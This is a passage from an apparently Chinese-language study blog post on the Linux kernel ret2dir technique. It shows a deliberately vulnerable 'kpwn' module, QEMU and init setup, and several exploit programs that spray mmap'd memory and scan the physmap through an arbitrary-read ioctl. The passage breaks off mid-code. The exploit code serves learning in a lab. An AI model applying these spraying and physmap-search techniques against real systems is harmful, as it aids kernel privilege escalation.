class="string">&quot;kpwn&quot;</span>,</span><br><span class="line">    .fops = &amp;fops</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">kpwn_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    misc_register(&amp;misc);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kpwn_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Goodbye hackern&quot;</span>);</span><br><span class="line">    misc_deregister(&amp;misc);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(kpwn_init);</span><br><span class="line">module_exit(kpwn_exit);</span><br></pre></td></tr></table></figure></div>

<p>使用如下makefile进行编译内核模块，这里<strong>KERNELDR</strong>需要换成自己编译好的内核目录<strong>obj-m</strong>指定了目标输出文件：</p>
<div class="highlight-container" data-rel="Makefile"><figure class="iseeu highlight makefile"><table><tr><td class="code"><pre><span class="line">obj-m := myko.o</span><br><span class="line"></span><br><span class="line">KERNELDR := /mnt/e/ctf/kernel/linux-5.15.153</span><br><span class="line"></span><br><span class="line">PWD := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"></span><br><span class="line"><span class="section">modules:  </span></span><br><span class="line">	<span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">modules_install:</span></span><br><span class="line">	<span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDR)</span> M=<span class="variable">$(PWD)</span> modules_install</span><br><span class="line"></span><br><span class="line"><span class="section">modules_prepare:</span></span><br><span class="line">	<span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDIR)</span> M=<span class="variable">$(PWD)</span> modules_prepare</span><br><span class="line"></span><br><span class="line"><span class="section">clean:  </span></span><br><span class="line">	rm -rf *.o *~ core .depend .*.cmd *.mod.c .tmp_versions *.mod *.order *.symvers</span><br></pre></td></tr></table></figure></div>

<p>我使用的启动脚本如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// run.sh</span></span><br><span class="line">exec qemu-system-x86_64 \</span><br><span class="line">    -cpu kvm64,+smep,+smap \</span><br><span class="line">    -m <span class="number">150</span>M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 nokaslr pti=on quiet oops=panic panic=1&quot;</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -kernel <span class="string">&quot;./bzImage&quot;</span> \</span><br><span class="line">    -initrd <span class="string">&quot;./initramfs.cpio&quot;</span> \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure></div>

<p>文件系统中的init文件如下：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">chown</span> -R 0:0 /</span><br><span class="line">mount -t tmpfs tmpfs /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"></span><br><span class="line"><span class="built_in">chown</span> 0:0 /flag</span><br><span class="line"><span class="built_in">chmod</span> 400 /flag</span><br><span class="line"><span class="built_in">chmod</span> 777 /tmp</span><br><span class="line"></span><br><span class="line">insmod myko.ko</span><br><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>这里我在手动创建文件系统时遇到了一些问题，由于lib中的命令都是用静态编译的<strong>busybox</strong>链接实现，我一开始是直接利用busybox的list指令列出所有可用的函数，然后全部解析到lib目录中。但是这个list中并不包括 <strong>setuidgid</strong> 这个命令，导致不能成功进入内核，所以还需要手动导一下<strong>setgiduid</strong>，自动化脚本如下。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> bin</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> cmd <span class="keyword">in</span> $(busybox --list); <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">ln</span> -sf busybox <span class="variable">$cmd</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ln</span> -sf busybox setuidgid</span><br></pre></td></tr></table></figure></div>

<p>之后我们可以写一个exp来验证ret2dir手法核心原理，我们的exp先准备好一些交互用的函数：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc exp.c -static -masm=intel -g -o exp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> READ_ANY  0x1111</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WRITE_ANY 0x2222</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD_ANY   0x3333</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEL_ANY   0x4444</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint32_t</span> u32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int32_t</span> s32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint64_t</span> u64;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int64_t</span> s64;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">loglx</span><span class="params">(<span class="type">char</span> *tag,<span class="type">uint64_t</span> num)</span>&#123;			<span class="comment">//用来打印地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[lx] &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; %-20s &quot;</span>,tag);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;: %-#16lx&quot;</span>,num);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_args</span>&#123;</span>        </span><br><span class="line">    <span class="type">uint64_t</span> addr;     </span><br><span class="line">    <span class="type">uint64_t</span> size;     </span><br><span class="line">    <span class="type">char</span> *buf;  </span><br><span class="line">&#125;;                     </span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add_any</span><span class="params">(<span class="type">int</span> fd,u64 size,<span class="type">char</span> *buf)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_args</span> <span class="title">in</span>;</span></span><br><span class="line">    in.buf=buf;</span><br><span class="line">    in.size=size;</span><br><span class="line">    <span class="type">long</span> res = ioctl(fd,ADD_ANY,&amp;in);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">read_any</span><span class="params">(<span class="type">int</span> fd,u64 addr,<span class="type">char</span> *buf,u64 size)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_args</span> <span class="title">in</span>;</span></span><br><span class="line">    in.addr = addr;</span><br><span class="line">    in.buf=buf;</span><br><span class="line">    in.size=size;</span><br><span class="line">    <span class="type">long</span> res = ioctl(fd,READ_ANY,&amp;in);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">write_any</span><span class="params">(<span class="type">int</span> fd,u64 addr,<span class="type">char</span> *buf,u64 size)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_args</span> <span class="title">in</span>;</span></span><br><span class="line">    in.addr = addr;</span><br><span class="line">    in.buf=buf;</span><br><span class="line">    in.size=size;</span><br><span class="line">    <span class="type">long</span> res = ioctl(fd,WRITE_ANY,&amp;in);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">del_any</span><span class="params">(<span class="type">int</span> fd,u64 addr)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_args</span> <span class="title">in</span>;</span></span><br><span class="line">    in.addr = addr;</span><br><span class="line">    <span class="type">long</span> res = ioctl(fd,DEL_ANY,&amp;in);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然后我们在main函数中先用add_any函数申请一块内存，然后靠着返回的地址在用户态打印出来看看。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    </span><br><span class="line">    fd = open(<span class="string">&quot;/dev/kpwn&quot;</span>,O_RDONLY); </span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    u64 *buf64 = (u64 *)buf;</span><br><span class="line">    add_any(fd,<span class="number">0x200</span>,buf64);</span><br><span class="line">    u64 slab_addr = buf64[<span class="number">0</span>];</span><br><span class="line">    loglx(<span class="string">&quot;slab_addr&quot;</span>,slab_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250308231319166.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250308232224327.png"
                      class=""
                >

<p>然后我们去查询对应内核版本的内存布局情况，主要用的是<a class="link"   href="https://elixir.bootlin.com/linux" >这个网站<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，选择对应的版本后进入<code>source/Documentation/x86/x86_64/mm.txt</code>即可查看内存布局（有时候是mm.rst）。这里我用的内核版本是linux-5.15.153，查询到的结果如下，我们kmalloc申请到的内存确实是在<code>direct mapping of all physical memory</code>中的，也就是大家所称为的<strong>physmap</strong>。这里我在调试时喷射的内存在<strong>kmalloc</strong>申请到的内存的更高地址处，这里获取slab分配的地址时其实不用像原文一样进行按位与处理。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250308232101958.png"
                      class=""
                >

<p>之后就可以进行内存喷射并且搜索内存了，比如有如下exp：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc exp.c -static -masm=intel -o exp</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> READ_ANY  0x1111</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WRITE_ANY 0x2222</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD_ANY   0x3333</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEL_ANY   0x4444</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint32_t</span> u32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int32_t</span> s32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint64_t</span> u64;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int64_t</span> s64;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">loginfo</span><span class="params">(<span class="type">char</span> *tag)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[%s] &quot;</span>,tag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">loglx</span><span class="params">(<span class="type">char</span> *tag,<span class="type">uint64_t</span> num)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[lx] &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; %-20s &quot;</span>,tag);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;: %-#16lx&quot;</span>,num);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_args</span>&#123;</span>        </span><br><span class="line">    <span class="type">uint64_t</span> addr;     </span><br><span class="line">    <span class="type">uint64_t</span> size;     </span><br><span class="line">    <span class="type">char</span> *buf;  </span><br><span class="line">&#125;;                     </span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add_any</span><span class="params">(<span class="type">int</span> fd,u64 size,<span class="type">char</span> *buf)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_args</span> <span class="title">in</span>;</span></span><br><span class="line">    in.buf=buf;</span><br><span class="line">    in.size=size;</span><br><span class="line">    <span class="type">long</span> res = ioctl(fd,ADD_ANY,&amp;in);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">read_any</span><span class="params">(<span class="type">int</span> fd,u64 addr,<span class="type">char</span> *buf,u64 size)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_args</span> <span class="title">in</span>;</span></span><br><span class="line">    in.addr = addr;</span><br><span class="line">    in.buf=buf;</span><br><span class="line">    in.size=size;</span><br><span class="line">    <span class="type">long</span> res = ioctl(fd,READ_ANY,&amp;in);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">write_any</span><span class="params">(<span class="type">int</span> fd,u64 addr,<span class="type">char</span> *buf,u64 size)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_args</span> <span class="title">in</span>;</span></span><br><span class="line">    in.addr = addr;</span><br><span class="line">    in.buf=buf;</span><br><span class="line">    in.size=size;</span><br><span class="line">    <span class="type">long</span> res = ioctl(fd,WRITE_ANY,&amp;in);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">del_any</span><span class="params">(<span class="type">int</span> fd,u64 addr)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_args</span> <span class="title">in</span>;</span></span><br><span class="line">    in.addr = addr;</span><br><span class="line">    <span class="type">long</span> res = ioctl(fd,DEL_ANY,&amp;in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> spray_times 32*32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mp_size 1024*64</span></span><br><span class="line"><span class="type">void</span> *spray[spray_times];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    </span><br><span class="line">    fd = open(<span class="string">&quot;/dev/kpwn&quot;</span>,O_RDONLY); </span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    u64 *buf64 = (u64 *)buf;</span><br><span class="line">    add_any(fd,<span class="number">0x200</span>,buf64);</span><br><span class="line">    u64 slab_addr = buf64[<span class="number">0</span>] &amp; <span class="number">0xffffffffff000000</span>;</span><br><span class="line">    loglx(<span class="string">&quot;slab_addr&quot;</span>,slab_addr);</span><br><span class="line">    del_any(fd,slab_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;spray_times;i++)&#123;</span><br><span class="line">        <span class="comment">// 内存喷射，大量在用户空间申请内存</span></span><br><span class="line">        <span class="type">void</span> *mp;</span><br><span class="line">        mp = mmap(<span class="literal">NULL</span>,mp_size,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(mp==MAP_FAILED)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;mmap error\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(mp,<span class="string">&#x27;A&#x27;</span>,mp_size);</span><br><span class="line">        spray[i]=mp;</span><br><span class="line">    &#125;</span><br><span class="line">    loginfo(<span class="string">&quot;searching\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (u64 addr=slab_addr;addr&lt;<span class="number">0xffffc80000000000</span>;addr+=<span class="number">0x1000</span>)&#123;</span><br><span class="line">        <span class="comment">// 内存搜索，寻找连串的A开始的地址，也就是对应用户空间相应的内存</span></span><br><span class="line">        <span class="type">char</span> *target = <span class="string">&quot;AAAAAAAA&quot;</span>;</span><br><span class="line">        <span class="type">char</span> *dirty = <span class="string">&quot;BBBBBBBB&quot;</span>;</span><br><span class="line">        u64 pos = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">0x1000</span>);</span><br><span class="line">        read_any(fd,addr,buf,<span class="number">0x1000</span>);</span><br><span class="line">        pos = (u64)memmem(buf,<span class="number">0x1000</span>,target,<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (pos)&#123;</span><br><span class="line">            u64 addr_to_change = addr + (pos-(u64)buf);</span><br><span class="line">            loglx(<span class="string">&quot;physmap hit!&quot;</span>,addr);</span><br><span class="line">            loglx(<span class="string">&quot;addr_to_change&quot;</span>,addr_to_change);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>执行exp时有时候会遇到内存不足的问题，由于我们要提高physmap的命中率，所以要尽可能耗尽所有内存进行内存喷射，我们的exp是申请了64MB的内存，我们可以进入内核使用<code>free -h</code>查看<code>available</code>的数值大小，也就是应用程序可用内存。这里我在<strong>run.sh</strong>中设置128M内存时是不够用的，256M内存又搜半天没结果，后面我用150M内存进入内核一下子就碰撞到physmap。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250309121624100.png"
                      class=""
                >

<p>但有时候hit时并不是直接到了我们喷射的内存中，而是我们加载到内存中的代码，这样的话我们在每次找到pos时就不要用break退出了，这样就能找到我们实际大量申请的内存。其实还有种更改的方案是自定义一个不需要指定target的类似memmem的函数，这样就不会需要硬编码写target了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250309133155698.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250309134242679.png"
                      class=""
                >

<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// memmem替代函数</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">find_series</span><span class="params">(<span class="type">char</span> *buf,<span class="type">size_t</span> buflen,<span class="type">char</span> c,<span class="type">int</span> len)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (buf == <span class="literal">NULL</span> || buflen == <span class="number">0</span> || len &gt; buflen || len &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        </span><br><span class="line">    <span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;buflen;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(buf[i]==c)</span><br><span class="line">            count++;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            count=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(count==len)</span><br><span class="line">            <span class="keyword">return</span> i-len+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然后就能一遍找到对应喷射内存，然后我想验证用户空间与内核空间在physmap上的对应关系，这里我尝试了改用户空间的内容再在原来内核空间搜索到的位置来验证，但是却不能正确修改，而是在其它地址位置能找到修改后的内容。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/kpwn&quot;</span>,O_RDONLY); </span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    u64 *buf64 = (u64 *)buf;</span><br><span class="line">    add_any(fd,<span class="number">0x200</span>,buf64);</span><br><span class="line">    </span><br><span class="line">    u64 slab_addr = buf64[<span class="number">0</span>];</span><br><span class="line">    loglx(<span class="string">&quot;raw_slab_addr&quot;</span>,slab_addr);</span><br><span class="line">    slab_addr = slab_addr &amp; <span class="number">0xffffffffff000000</span>;</span><br><span class="line">    loglx(<span class="string">&quot;slab_addr&quot;</span>,slab_addr);</span><br><span class="line">    del_any(fd,slab_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;spray_times;i++)&#123;</span><br><span class="line">        <span class="comment">// 内存喷射，大量在用户空间申请内存</span></span><br><span class="line">        <span class="type">void</span> *mp;</span><br><span class="line">        mp = mmap(<span class="literal">NULL</span>,mp_size,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(mp==MAP_FAILED)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;mmap error\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(mp,<span class="string">&#x27;A&#x27;</span>,mp_size);</span><br><span class="line">        spray[i]=mp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (u64 addr=slab_addr;addr&lt;<span class="number">0xffffc80000000000</span>;addr+=<span class="number">0x1000</span>)&#123;</span><br><span class="line">        <span class="comment">// 内存搜索，寻找连串的A开始的地址，也就是对应用户空间相应的内存</span></span><br><span class="line">        </span><br><span class="line">        u64 pos = <span class="number">0</span>;</span><br><span class="line">        u64 addr_to_change;</span><br><span class="line">        <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">0x1000</span>);</span><br><span class="line">        read_any(fd,addr,buf,<span class="number">0x1000</span>);</span><br><span class="line">        pos = find_series(buf,<span class="number">0x1000</span>,<span class="string">&#x27;A&#x27;</span>,<span class="number">0x100</span>);</span><br><span class="line">        <span class="keyword">if</span> (pos!=<span class="number">-1</span>)&#123;</span><br><span class="line">            addr_to_change = addr + pos;</span><br><span class="line">            loglx(<span class="string">&quot;physmap hit!&quot;</span>,addr);</span><br><span class="line">            loglx(<span class="string">&quot;addr_to_change&quot;</span>,addr_to_change);</span><br><span class="line">            loginfo(<span class="string">&quot;changing spray&quot;</span>);</span><br><span class="line"></span><br><span class="line">            add_any(fd,<span class="number">0x500</span>,buf);      <span class="comment">//方便打断点</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;spray_times;i++)&#123;</span><br><span class="line">                <span class="built_in">memset</span>(spray[i],<span class="string">&#x27;B&#x27;</span>,<span class="number">0x1000</span>);    <span class="comment">// 在用户态修改对应内存</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 查看内核态对应位置内容是否变化</span></span><br><span class="line">            <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">0x1000</span>);</span><br><span class="line">            read_any(fd,addr_to_change,buf,<span class="number">0x40</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250309155512009.png"
                      class=""
                >

<p>但如果是改内核空间的内容，然后在用户态查看内容是否有被修改，就能轻易的验证。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">x64dump</span><span class="params">(<span class="type">char</span> *buf,<span class="type">uint32_t</span> num)</span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 =  (<span class="type">uint64_t</span> *)buf;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-x64dump-] start : \n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;num;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">0</span> &amp;&amp; i!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%016lx &quot;</span>,*(buf64+i));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n[-x64dump-] end ... \n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">u64 *<span class="title function_">check</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;spray_times;i++)&#123;</span><br><span class="line">        u64 *p = spray[i];</span><br><span class="line">        <span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(j&lt;mp_size/<span class="number">8</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(p[j]!=<span 